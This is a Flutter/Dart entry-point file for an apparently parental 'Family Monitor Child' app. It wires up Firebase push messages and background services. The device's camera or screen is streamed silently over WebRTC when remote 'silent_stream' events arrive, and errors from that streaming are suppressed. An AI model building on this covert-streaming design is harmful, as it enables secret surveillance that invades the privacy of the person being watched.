import 'dart:async';
import 'dart:ui';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_crashlytics/firebase_crashlytics.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';

import 'screens/child/child_auth_screen.dart';
import 'screens/child/child_home_screen.dart';
import 'screens/child/child_setup_wizard_screen.dart';

import 'services/auth_service.dart';
import 'services/background_monitoring_service.dart';
import 'services/foreground_service.dart';
import 'services/silent_webrtc_service.dart';

final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();

@pragma('vm:entry-point')
Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  try {
    if (Firebase.apps.isEmpty) {
      try {
        await Firebase.initializeApp();
      } catch (e, st) {
        debugPrint('Firebase init error in background handler: $e');
        debugPrintStack(stackTrace: st);
        return;
      }
    }
    if (message.data['type'] == 'call') {
      final service = FlutterBackgroundService();
      if (!await service.isRunning()) {
        await service.startService();
      }
    }
  } catch (e, st) {
    debugPrint('[FCM Background] Unhandled error: $e');
    debugPrintStack(stackTrace: st);
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  FlutterForegroundTask.initCommunicationPort();

  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  // Firebase MUST be initialized before Crashlytics handlers are wired up
  try {
    await Firebase.initializeApp();
  } catch (e) {
    debugPrint('Firebase init error: $e');
  }

  // Wire error handlers AFTER Firebase is ready
  FlutterError.onError = FirebaseCrashlytics.instance.recordFlutterFatalError;
  PlatformDispatcher.instance.onError = (error, stack) {
    FirebaseCrashlytics.instance.recordError(error, stack, fatal: true);
    return true;
  };

  FirebaseMessaging.onBackgroundMessage(firebaseMessagingBackgroundHandler);

  await BackgroundMonitoringService.initialize();
  await BackgroundMonitoringService.restoreIfNeeded();

  MonitoringForegroundService.initForegroundTask();

  runApp(const ChildApp());
}

class ChildApp extends StatefulWidget {
  const ChildApp({super.key});

  @override
  State<ChildApp> createState() => _ChildAppState();
}

class _ChildAppState extends State<ChildApp> {
  StreamSubscription? _silentStreamSub;
  StreamSubscription? _silentStopSub;

  @override
  void initState() {
    super.initState();

    _silentStreamSub = FlutterBackgroundService()
        .on('silent_stream')
        .listen((dynamic data) {
      if (data == null || data is! Map) return;
      final String? uid = data['uid'] as String?;
      final String mode = data['mode'] as String? ?? 'camera';
      if (uid == null) return;
      if (mode == 'screen') {
        SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
      } else {
        SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
      }
    });

    _silentStopSub = FlutterBackgroundService()
        .on('silent_stop')
        .listen((_) => SilentWebRTCService.instance.stopSilent());
  }

  @override
  void dispose() {
    _silentStreamSub?.cancel();
    _silentStopSub?.cancel();
    super.dispose();
  }

  Future<Widget> _getStartScreen() async {
    final auth = AuthService();
    if (!auth.isLoggedIn) return const ChildAuthScreen();
    final String? uid = auth.currentUser?.uid;
    if (uid == null) return const ChildAuthScreen();
    final bool wizardDone = await BackgroundMonitoringService.isWizardDone();
    if (!wizardDone) return ChildSetupWizardScreen(childUid: uid);
    return const ChildHomeScreen();
  }

  @override
  Widget build(BuildContext context) {
    return WithForegroundTask(
      child: MaterialApp(
        title: 'Family Monitor Child',
        debugShowCheckedModeBanner: false,
        navigatorKey: childNavKey,
        theme: ThemeData(
          useMaterial3: true,
          colorScheme: ColorScheme.fromSeed(
            seedColor: const Color(0xFF34A853),
          ),
        ),
        home: FutureBuilder<Widget>(
          future: _getStartScreen(),
          builder: (context, snapshot) {
            if (snapshot.hasError) {
              return Scaffold(
                backgroundColor: Colors.red,
                body: SafeArea(
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.all(16),
                    child: Text(
                      'ERROR:\n${snapshot.error}\n\nSTACK:\n${snapshot.stackTrace}',
                      style: const TextStyle(color: Colors.white, fontSize: 12),
                    ),
                  ),
                ),
              );
            }
            if (!snapshot.hasData) {
              return const Scaffold(
                backgroundColor: Color(0xFF34A853),
                body: Center(
                  child: CircularProgressIndicator(color: Colors.white),
                ),
              );
            }
            return snapshot.data!;
          },
        ),
        routes: {
          '/child/auth': (_) => const ChildAuthScreen(),
          '/child/setup': (_) => const ChildSetupWizardScreen(),
          '/child/home': (_) => const ChildHomeScreen(),
        },
      ),
    );
  }
}
